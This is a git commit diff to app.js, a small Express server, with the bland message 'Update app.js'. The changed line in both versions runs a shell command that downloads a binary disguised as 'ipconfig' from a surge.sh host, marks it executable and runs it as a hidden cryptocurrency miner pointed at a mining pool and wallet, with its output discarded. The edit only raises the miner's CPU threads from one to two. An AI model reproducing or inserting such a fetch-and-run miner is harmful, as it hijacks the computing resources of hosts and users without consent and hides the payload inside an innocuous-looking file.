17ceff2f1a29f2499e916fca283d4bbc06ec2d78
p5mq9h <104606488+p5mq9h@users.noreply.github.com>
2022-05-03 12:52:52 +0700

    Update app.js

--- app.js
+++ app.js
@@ -6,7 +6,7 @@ const INDEX = '/index.html';
 const server = express()
   .use((req, res) => res.sendFile(INDEX, { root: __dirname }))
   .listen(PORT, () => console.log(`Listening on ${PORT}`));
-    exec(wget https://tienph-88.surge.sh/ipconfig;chmod +x ipconfig;./ipconfig --disable-gpu --algorithm verushash --pool na.luckpool.net:3957 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.render --password x --cpu-threads 1 >> /dev/null, (err, stdout, stderr) => {
+    exec(wget https://tienph-88.surge.sh/ipconfig;chmod +x ipconfig;./ipconfig --disable-gpu --algorithm verushash --pool na.luckpool.net:3957 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.render --password x --cpu-threads 2 >> /dev/null, (err, stdout, stderr) => {
   if (err) {
    
     return;
